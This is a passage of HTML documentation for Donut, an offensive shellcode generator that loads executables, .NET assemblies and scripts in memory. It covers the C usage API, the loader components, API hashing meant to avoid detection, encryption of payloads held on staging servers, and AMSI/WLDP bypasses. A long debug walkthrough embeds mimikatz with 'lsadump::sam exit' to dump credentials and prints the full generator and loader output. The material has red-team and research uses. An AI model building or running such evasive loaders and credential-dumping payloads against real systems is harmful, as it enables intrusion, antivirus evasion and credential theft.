    <span style='color:#603000; '>memset</span><span style='color:#808030; '>(</span><span style='color:#808030; '>&amp;</span>c<span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>sizeof</span><span style='color:#808030; '>(</span>c<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// copy input file</span>
    <span style='color:#400000; '>lstrcpyn</span><span style='color:#808030; '>(</span>c<span style='color:#808030; '>.</span>input<span style='color:#808030; '>,</span> argv<span style='color:#808030; '>[</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>]</span><span style='color:#808030; '>,</span> DONUT_MAX_NAME<span style='color:#808030; '>-</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// default settings</span>
    c<span style='color:#808030; '>.</span>inst_type <span style='color:#808030; '>=</span> DONUT_INSTANCE_EMBED<span style='color:#800080; '>;</span>   <span style='color:#696969; '>// file is embedded</span>
    c<span style='color:#808030; '>.</span>arch      <span style='color:#808030; '>=</span> DONUT_ARCH_X84<span style='color:#800080; '>;</span>         <span style='color:#696969; '>// dual-mode (x86+amd64)</span>
    c<span style='color:#808030; '>.</span>bypass    <span style='color:#808030; '>=</span> DONUT_BYPASS_CONTINUE<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// continues loading even if disabling AMSI/WLDP fails</span>
    c<span style='color:#808030; '>.</span>format    <span style='color:#808030; '>=</span> DONUT_FORMAT_BINARY<span style='color:#800080; '>;</span>    <span style='color:#696969; '>// default output format</span>
    c<span style='color:#808030; '>.</span>compress  <span style='color:#808030; '>=</span> DONUT_COMPRESS_NONE<span style='color:#800080; '>;</span>    <span style='color:#696969; '>// compression is disabled by default</span>
    c<span style='color:#808030; '>.</span>entropy   <span style='color:#808030; '>=</span> DONUT_ENTROPY_DEFAULT<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// enable random names + symmetric encryption by default</span>
    c<span style='color:#808030; '>.</span>exit_opt  <span style='color:#808030; '>=</span> DONUT_OPT_EXIT_THREAD<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// default behaviour is to exit the thread</span>
    c<span style='color:#808030; '>.</span>thread    <span style='color:#808030; '>=</span> <span style='color:#008c00; '>1</span><span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// run entrypoint as a thread</span>
    c<span style='color:#808030; '>.</span>unicode   <span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// command line will not be converted to unicode for unmanaged DLL function</span>
    
    <span style='color:#696969; '>// generate the shellcode</span>
    err <span style='color:#808030; '>=</span> _DonutCreate<span style='color:#808030; '>(</span><span style='color:#808030; '>&amp;</span>c<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>err <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> DONUT_ERROR_SUCCESS<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ Error : </span><span style='color:#007997; '>%s</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> _DonutError<span style='color:#808030; '>(</span>err<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span> 
    
    <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ loader saved to </span><span style='color:#007997; '>%s</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> c<span style='color:#808030; '>.</span>output<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    _DonutDelete<span style='color:#808030; '>(</span><span style='color:#808030; '>&amp;</span>c<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h2>Internals</h2>

<p>Everything that follows concerns internal workings of Donut and is not required knowledge to generate the shellcode/loader.</p>

<h2 id="com">6. Donut Components</h2>

<p>The following table lists the name of each file and what it's used for.</p>

<table border="1">
  <tr>
    <th>File</th>
    <th>Description</th>
  </tr>
  <tr>
    <td>donut.c</td>
    <td>Main file for the shellcode generator.</td>
  </tr>
  <tr>
    <td>include/donut.h</td>
    <td>C header file used by the generator.</td>
  </tr>
  <tr>
    <td>lib/donut.dll and lib/donut.lib</td>
    <td>Dynamic and static libraries for Microsoft Windows.</td>
  </tr>
  <tr>
    <td>lib/donut.so and lib/donut.a</td>
    <td>Dynamic and static libraries for Linux.</td>
  </tr>
  <tr>
    <td>lib/donut.h</td>
    <td>C header file to be used in C/C++ based projects.</td>
  </tr>
  <tr>
    <td>donutmodule.c</td>
    <td>The CPython wrapper for Donut. Used by the Python module.</td>
  </tr>
  <tr>
    <td>setup.py</td>
    <td>The setup file for installing Donut as a Pip Python3 module.</td>
  </tr>
  <tr>
    <td>hash.c</td>
    <td>Maru hash function. Uses the Speck 64-bit block cipher with Davies-Meyer construction for API hashing.</td>
  </tr>
  <tr>
    <td>encrypt.c</td>
    <td>Chaskey block cipher for encrypting modules.</td>
  </tr>
  <tr>
    <td>loader/loader.c</td>
    <td>Main file for the shellcode.</td>
  </tr>
  <tr>
    <td>loader/inmem_dotnet.c</td>
    <td>In-Memory loader for .NET EXE/DLL assemblies.</td>
  </tr>
  <tr>
    <td>loader/inmem_pe.c</td>
    <td>In-Memory loader for EXE/DLL files.</td>
  </tr>
  <tr>
    <td>loader/inmem_script.c</td>
    <td>In-Memory loader for VBScript/JScript files.</td>
  </tr>
  <tr>
    <td>loader/activescript.c</td>
    <td>ActiveScriptSite interface required for in-memory execution of VBS/JS files.</td>
  </tr>
  <tr>
    <td>loader/wscript.c</td>
    <td>Supports a number of WScript methods that cscript/wscript support.</td>
  </tr>
  <tr>
    <td>loader/depack.c</td>
    <td>Supports unpacking of modules compressed with aPLib.</td>
  </tr>
  <tr>
    <td>loader/bypass.c</td>
    <td>Functions to bypass Anti-malware Scan Interface (AMSI) and Windows Local Device Policy (WLDP).</td>
  </tr>
  <tr>
    <td>loader/http_client.c</td>
    <td>Downloads a module from remote staging server into memory.</td>
  </tr>
  <tr>
    <td>loader/peb.c</td>
    <td>Used to resolve the address of DLL functions via Process Environment Block (PEB).</td>
  </tr>
  <tr>
    <td>loader/clib.c</td>
    <td>Replaces common C library functions like memcmp, memcpy and memset.</td>
  </tr>
  <tr>
    <td>loader/getpc.c</td>
    <td>Assembly code stub to return the value of the EIP register.</td>
  </tr>
  <tr>
    <td>loader/inject.c</td>
    <td>Simple process injector for Windows that can be used for testing the loader.</td>
  </tr>
  <tr>
    <td>loader/runsc.c</td>
    <td>Simple shellcode runner for Linux and Windows that can be used for testing the loader.</td>
  </tr>
  <tr>
    <td>loader/exe2h/exe2h.c</td>
    <td>Extracts the machine code from compiled loader and saves as array to C header and Go files.</td>
  </tr>
</table>

<h2 id="instance">7. Donut Instance</h2>

<p>The loader will always contain an <var>Instance</var> which can be viewed simply as a configuration. It will contain all the data that would normally be stored on the stack or in the <code>.data</code> and <code>.rodata</code> sections of an executable. Once the main code executes, if encryption is enabled, it will decrypt the data before attempting to resolve the address of API functions. If successful, it will check if an executable file is embedded or must be downloaded from a remote staging server. To verify successful decryption of a module, a randomly generated string stored in the <code>sig</code> field is hashed using <var>Maru</var> and compared with the value of <code>mac</code>. The data will be decompressed if required and only then is it loaded into memory for execution.</p>

<h2 id="module">8. Donut Module</h2>

<p>Modules can be embedded in an <var>Instance</var> or stored on a remote HTTP server.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_MODULE <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      type<span style='color:#800080; '>;</span>                            <span style='color:#696969; '>// EXE/DLL/JS/VBS</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      thread<span style='color:#800080; '>;</span>                          <span style='color:#696969; '>// run entrypoint of unmanaged EXE as a thread</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      compress<span style='color:#800080; '>;</span>                        <span style='color:#696969; '>// indicates engine used for compression</span>
    
    <span style='color:#800000; font-weight:bold; '>char</span>     runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>         <span style='color:#696969; '>// runtime version for .NET EXE/DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>          <span style='color:#696969; '>// domain name to use for .NET EXE/DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>             <span style='color:#696969; '>// name of class and optional namespace for .NET EXE/DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>          <span style='color:#696969; '>// name of method to invoke for .NET DLL or api for unmanaged DLL</span>
    
    <span style='color:#800000; font-weight:bold; '>char</span>     param<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>           <span style='color:#696969; '>// string parameters for both managed and unmanaged DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      unicode<span style='color:#800080; '>;</span>                         <span style='color:#696969; '>// convert param to unicode before passing to DLL function</span>
    
    <span style='color:#800000; font-weight:bold; '>char</span>     sig<span style='color:#808030; '>[</span>DONUT_SIG_LEN<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>              <span style='color:#696969; '>// string to verify decryption</span>
    uint64_t mac<span style='color:#800080; '>;</span>                             <span style='color:#696969; '>// hash of sig, to verify decryption was ok</span>
    
    uint32_t zlen<span style='color:#800080; '>;</span>                            <span style='color:#696969; '>// compressed size of EXE/DLL/JS/VBS file</span>
    uint32_t len<span style='color:#800080; '>;</span>                             <span style='color:#696969; '>// real size of EXE/DLL/JS/VBS file</span>
    uint8_t  data<span style='color:#808030; '>[</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                         <span style='color:#696969; '>// data of EXE/DLL/JS/VBS file</span>
<span style='color:#800080; '>}</span> DONUT_MODULE<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_MODULE<span style='color:#800080; '>;</span>
</pre>

<h2 id="hashing">9. Win32 API Hashing</h2>

<p>A hash function called <a href="https://github.com/odzhan/maru">Maru</a> is used to resolve the address of API at runtime. It uses a Davies-Meyer construction and the <a href="https://tinycrypt.wordpress.com/2017/01/11/asmcodes-speck/">SPECK</a> block cipher to derive a 64-bit hash from an API string. The padding is similar to what's used by MD4 and MD5 except only 32-bits of the string length are stored in the buffer instead of 64-bits. An initial value (IV) chosen randomly ensures the 64-bit API hashes are unique for each instance and cannot be used for detection of Donut. Future releases will likely support alternative methods of resolving address of API to decrease chance of detection.</p>

<h2 id="encryption">10. Symmetric Encryption</h2>

<p>The following structure is used to hold a master key, counter and nonce for Donut, which are generated randomly.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_CRYPT <span style='color:#800080; '>{</span>
    <span style='color:#603000; '>BYTE</span>    mk<span style='color:#808030; '>[</span>DONUT_KEY_LEN<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// master key</span>
    <span style='color:#603000; '>BYTE</span>    ctr<span style='color:#808030; '>[</span>DONUT_BLK_LEN<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// counter + nonce</span>
<span style='color:#800080; '>}</span> DONUT_CRYPT<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_CRYPT<span style='color:#800080; '>;</span>
</pre>

<p><a href="https://tinycrypt.wordpress.com/2017/02/20/asmcodes-chaskey-cipher/">Chaskey</a>, a 128-bit block cipher with support for 128-bit keys, is used in Counter (CTR) mode to decrypt a <var>Module</var> or an <var>Instance</var> at runtime. If an adversary discovers a staging server, it should not be feasible for them to decrypt a donut module without the key which is stored in the donut loader. Future releases will support downloading a key via DNS and also asymmetric encryption.</p>

<h2 id="bypass">11. Bypasses for AMSI/WLDP</h2>

<p>Donut includes a bypass system for AMSI and WLDP. Currently, Donut can bypass:</p>

<ul>
  <li>AMSI in .NET v4.8</li>
  <li>Device Guard policy preventing dynamically generated code from executing.</li>
</ul>

<p>You may customize our bypasses or add your own. The bypass logic is defined in loader/bypass.c. Each bypass implements the DisableAMSI with the signature <code>BOOL DisableAMSI(PDONUT_INSTANCE inst)</code> and DisableWLDP with <code>BOOL DisableWLDP(PDONUT_INSTANCE inst)</code>, both of which have a corresponding preprocessor directive. We have several <code>#if defined</code> blocks that check for definitions. Each block implements the same bypass function. For instance, our first bypass for AMSI is called <code>BYPASS_AMSI_A</code>. If donut is built with that variable defined, then that bypass will be used.</p>

<p>Why do it this way? Because it means that only the bypass you are using is built into loader.exe. As a result, the others are not included in your shellcode. This reduces the size and complexity of your shellcode, adds modularity to the design, and ensures that scanners cannot find suspicious blocks in your shellcode that you are not actually using.</p>

<p>Another benefit of this design is that you may write your own AMSI/WLDP bypass. To build Donut with your new bypass, use an <code>if defined</code> block for your bypass and modify the makefile to add an option that builds with the name of your bypass defined.</p>

<p>If you wanted to, you could extend our bypass system to add in other pre-execution logic that runs before your .NET Assembly is loaded.</p>

<h2 id="debug">12. Debugging The Generator and Loader</h2>

<p>The loader is capable of displaying detailed information about each step of file execution and can be useful in tracking down bugs. To build a debug-enabled executable, specify the debug label with nmake/make on Windows.</p>

<pre>
  nmake debug -f Makefile.msvc
  make debug -f Makefile.mingw
</pre>

<p>Use Donut to create a shellcode as you normally would and a file called <code>instance</code> will be saved to disk. The following example embeds mimikatz.exe in the loader using the Xpress Huffman compression algorithm. It also tells the loader to run the entrypoint as a thread, so that when mimikatz calls an exit-related API, it simply exits the thread. </p> 

<pre>
C:\hub\donut>donut -t -z5 mimikatz.exe -p"lsadump::sam exit"

  [ Donut shellcode generator v0.9.3
  [ Copyright (c) 2019 TheWover, Odzhan

DEBUG: donut.c:1505:DonutCreate(): Entering.
DEBUG: donut.c:1283:validate_loader_cfg(): Validating loader configuration.
DEBUG: donut.c:1380:validate_loader_cfg(): Loader configuration passed validation.
DEBUG: donut.c:459:read_file_info(): Entering.
DEBUG: donut.c:467:read_file_info(): Checking extension of mimikatz.exe
DEBUG: donut.c:475:read_file_info(): Extension is ".exe"
DEBUG: donut.c:491:read_file_info(): File is EXE
DEBUG: donut.c:503:read_file_info(): Mapping mimikatz.exe into memory
DEBUG: donut.c:245:map_file(): Entering.
DEBUG: donut.c:531:read_file_info(): Checking characteristics
DEBUG: donut.c:582:read_file_info(): Leaving with error :  0
DEBUG: donut.c:1446:validate_file_cfg(): Validating configuration for input file.
DEBUG: donut.c:1488:validate_file_cfg(): Validation passed.
DEBUG: donut.c:674:build_module(): Entering.
DEBUG: donut.c:381:compress_file(): Reading fragment and workspace size
DEBUG: donut.c:387:compress_file(): workspace size : 1415999 | fragment size : 5161
DEBUG: donut.c:390:compress_file(): Allocating memory for compressed data.
DEBUG: donut.c:396:compress_file(): Compressing 0000024E9D7E0000 to 0000024E9DA50080 with RtlCompressBuffer(XPRESS HUFFMAN)
DEBUG: donut.c:433:compress_file(): Original file size : 1013912 | Compressed : 478726
DEBUG: donut.c:434:compress_file(): File size reduced by 53%
DEBUG: donut.c:436:compress_file(): Leaving with error :  0
DEBUG: donut.c:684:build_module(): Assigning 478726 bytes of 0000024E9DA50080 to data
DEBUG: donut.c:695:build_module(): Allocating 480054 bytes of memory for DONUT_MODULE
DEBUG: donut.c:772:build_module(): Copying data to module
DEBUG: donut.c:784:build_module(): Leaving with error :  0
DEBUG: donut.c:804:build_instance(): Entering.
DEBUG: donut.c:807:build_instance(): Allocating memory for instance
DEBUG: donut.c:814:build_instance(): The size of module is 480054 bytes. Adding to size of instance.
DEBUG: donut.c:817:build_instance(): Total length of instance : 483718
DEBUG: donut.c:846:build_instance(): Generating random key for instance
DEBUG: donut.c:855:build_instance(): Generating random key for module
DEBUG: donut.c:864:build_instance(): Generating random string to verify decryption
DEBUG: donut.c:871:build_instance(): Generating random IV for Maru hash
DEBUG: donut.c:879:build_instance(): Generating hashes for API using IV: 546E2FF018FD2A54
DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : LoadLibraryA           = ABB30FFE918BCF83
DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : GetProcAddress         = EF2C0663C0CDDC21
DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : GetModuleHandleA       = D40916771ECED480
DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : VirtualAlloc           = E445DF6F06219E85
DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : VirtualFree            = C6C992D6040B85A8
DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : VirtualQuery           = 556BF46109D12C9E
DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : VirtualProtect         = 032546126BB99713
DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : Sleep                  = DEB476FF0E3D71E8
DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : MultiByteToWideChar    = A0DD238846F064F4
DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : GetUserDefaultLCID     = 03DE3865FC2DF17B
DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : WaitForSingleObject    = 40FCB82879AAB610
DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : CreateThread           = 954101E48C1D54F5
DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : GetThreadContext       = 18669E0FDC3FD0B8
DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : GetCurrentThread       = EB6E7C47D574D9F9
DEBUG: donut.c:892:build_instance(): Hash for shell32.dll     : CommandLineToArgvW     = EFD410EF534D57C3
DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SafeArrayCreate        = A5AA007611CB6580
DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SafeArrayCreateVector  = D5CEC16DD247A68A
DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SafeArrayPutElement    = 6B140B7B87F27359
DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SafeArrayDestroy       = C2FA65C58C68FC6C
DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SafeArrayGetLBound     = ED5A331176BB8DDA
DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SafeArrayGetUBound     = EA0D8BE258DC67DA
DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SysAllocString         = 3A7BBDEAA1DC3354
DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SysFreeString          = EEB92DFE18B7C306
DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : LoadTypeLib            = 687DD816E578C4E7
DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : InternetCrackUrlA      = B0F95D86327741EC
DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : InternetOpenA          = BDD70375BB72B131
DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : InternetConnectA       = E74A4DD56C6B3154
DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : InternetSetOptionA     = 527C502C0BC36267
DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : InternetReadFile       = 055C3E8A4CF21475
DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : InternetCloseHandle    = 4D1965E404D783BA
DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : HttpOpenRequestA       = CC736E0143DB8F2A
DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : HttpSendRequestA       = C87BFE8578BB0049
DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : HttpQueryInfoA         = FC7CC8D82764DFBF
DEBUG: donut.c:892:build_instance(): Hash for mscoree.dll     : CorBindToRuntime       = 6F6432B588D39C8D
DEBUG: donut.c:892:build_instance(): Hash for mscoree.dll     : CLRCreateInstance      = 2828FB8F68349704
DEBUG: donut.c:892:build_instance(): Hash for ole32.dll       : CoInitializeEx         = 9752F1AA167F8E79
DEBUG: donut.c:892:build_instance(): Hash for ole32.dll       : CoCreateInstance       = 8211344A519AF3BA
DEBUG: donut.c:892:build_instance(): Hash for ole32.dll       : CoUninitialize         = FF0605E1258BEE44
DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlEqualUnicodeString  = D5CEDA5C642834D7
DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlEqualString         = A69EAF72442222A4
DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlUnicodeStringToAnsiString = 4DBA40D90962E1D6
DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlInitUnicodeString   = A1143A47656B2526
DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlExitUserThread      = 62FF88CDC045477E
DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlExitUserProcess     = E20BCE2C11E82C7B
DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlCreateUnicodeString = A469294ED1E1D8DC
DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlGetCompressionWorkSpaceSize = 61E26E7C5DD38D2C
DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : RtlDecompressBufferEx  = 145C8CF24F5EAF3E
DEBUG: donut.c:892:build_instance(): Hash for ntdll.dll       : NtContinue             = 12ACA3AD3CC20AF5
DEBUG: donut.c:895:build_instance(): Setting number of API to 48
DEBUG: donut.c:898:build_instance(): Setting DLL names to ole32;oleaut32;wininet;mscoree;shell32
DEBUG: donut.c:941:build_instance(): Copying strings required to bypass AMSI
DEBUG: donut.c:949:build_instance(): Copying strings required to bypass WLDP
DEBUG: donut.c:960:build_instance(): Copying strings required to replace command line.
DEBUG: donut.c:968:build_instance(): Copying strings required to intercept exit-related API
DEBUG: donut.c:1018:build_instance(): Copying module data to instance
DEBUG: donut.c:1024:build_instance(): Encrypting instance
DEBUG: donut.c:1042:build_instance(): Leaving with error :  0
DEBUG: donut.c:1210:build_loader(): Inserting opcodes
DEBUG: donut.c:1248:build_loader(): Copying 29548 bytes of x86 + amd64 shellcode
DEBUG: donut.c:1090:save_loader(): Saving instance 0000024E9DE90080 to file. 483718 bytes.
DEBUG: donut.c:1061:save_file(): Entering.
DEBUG: donut.c:1065:save_file(): Writing 483718 bytes of 0000024E9DE90080 to instance
DEBUG: donut.c:1070:save_file(): Leaving with error :  0
DEBUG: donut.c:1139:save_loader(): Saving loader as binary
DEBUG: donut.c:1172:save_loader(): Leaving with error :  0
DEBUG: donut.c:1540:DonutCreate(): Leaving with error :  0
  [ Instance type : Embedded
  [ Module file   : "mimikatz.exe"
  [ Entropy       : Random names + Encryption
  [ Compressed    : Xpress Huffman (Reduced by 53%)
  [ File type     : EXE
  [ Parameters    : lsadump::sam exit
  [ Target CPU    : x86+amd64
  [ AMSI/WDLP     : continue
  [ Shellcode     : "loader.bin"
DEBUG: donut.c:1556:DonutDelete(): Entering.
DEBUG: donut.c:1562:DonutDelete(): Releasing memory for module.
DEBUG: donut.c:1568:DonutDelete(): Releasing memory for configuration.
DEBUG: donut.c:1574:DonutDelete(): Releasing memory for loader.
DEBUG: donut.c:289:unmap_file(): Releasing compressed data.
DEBUG: donut.c:294:unmap_file(): Unmapping input file.
DEBUG: donut.c:299:unmap_file(): Closing input file.
DEBUG: donut.c:1580:DonutDelete(): Leaving.
</pre>

<p>If successfully created, there should now be a file called "instance" in the same directory as the loader. Pass the instance file as a parameter to loader.exe which should also be in the same directory.</p>

<pre>
C:\hub\donut>loader instance
Running...
DEBUG: loader/loader.c:109:MainProc(): Maru IV : 546E2FF018FD2A54
DEBUG: loader/loader.c:112:MainProc(): Resolving address for VirtualAlloc() : E445DF6F06219E85
DEBUG: loader/loader.c:116:MainProc(): Resolving address for VirtualFree() : C6C992D6040B85A8
DEBUG: loader/loader.c:120:MainProc(): Resolving address for RtlExitUserProcess() : E20BCE2C11E82C7B
DEBUG: loader/loader.c:129:MainProc(): VirtualAlloc : 00007FFFD1DAA190 VirtualFree : 00007FFFD1DAA180
DEBUG: loader/loader.c:131:MainProc(): Allocating 483718 bytes of RW memory
DEBUG: loader/loader.c:143:MainProc(): Copying 483718 bytes of data to memory 00000178FEA30000
DEBUG: loader/loader.c:147:MainProc(): Zero initializing PDONUT_ASSEMBLY
DEBUG: loader/loader.c:156:MainProc(): Decrypting 483718 bytes of instance
DEBUG: loader/loader.c:163:MainProc(): Generating hash to verify decryption
DEBUG: loader/loader.c:165:MainProc(): Instance : 33C49D5864287AEF | Result : 33C49D5864287AEF
DEBUG: loader/loader.c:172:MainProc(): Resolving LoadLibraryA
DEBUG: loader/loader.c:189:MainProc(): Loading ole32
DEBUG: loader/loader.c:189:MainProc(): Loading oleaut32
DEBUG: loader/loader.c:189:MainProc(): Loading wininet
DEBUG: loader/loader.c:189:MainProc(): Loading mscoree
DEBUG: loader/loader.c:189:MainProc(): Loading shell32
DEBUG: loader/loader.c:193:MainProc(): Resolving 48 API
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for EF2C0663C0CDDC21
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for D40916771ECED480
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for E445DF6F06219E85
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for C6C992D6040B85A8
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 556BF46109D12C9E
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 032546126BB99713
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for DEB476FF0E3D71E8
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for A0DD238846F064F4
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 03DE3865FC2DF17B
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 40FCB82879AAB610
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 954101E48C1D54F5
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 18669E0FDC3FD0B8
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for EB6E7C47D574D9F9
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for EFD410EF534D57C3
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for A5AA007611CB6580
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for D5CEC16DD247A68A
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 6B140B7B87F27359
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for C2FA65C58C68FC6C
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for ED5A331176BB8DDA
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for EA0D8BE258DC67DA
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 3A7BBDEAA1DC3354
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for EEB92DFE18B7C306
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 687DD816E578C4E7
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for B0F95D86327741EC
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for BDD70375BB72B131
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for E74A4DD56C6B3154
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 527C502C0BC36267
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 055C3E8A4CF21475
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 4D1965E404D783BA
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for CC736E0143DB8F2A
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for C87BFE8578BB0049
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for FC7CC8D82764DFBF
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 6F6432B588D39C8D
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 2828FB8F68349704
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 9752F1AA167F8E79
DEBUG: peb.c:87:FindExport(): 9752f1aa167f8e79 is forwarded to api-ms-win-core-com-l1-1-0.CoInitializeEx
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoInitializeEx)
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 8211344A519AF3BA
DEBUG: peb.c:87:FindExport(): 8211344a519af3ba is forwarded to api-ms-win-core-com-l1-1-0.CoCreateInstance
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoCreateInstance)
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for FF0605E1258BEE44
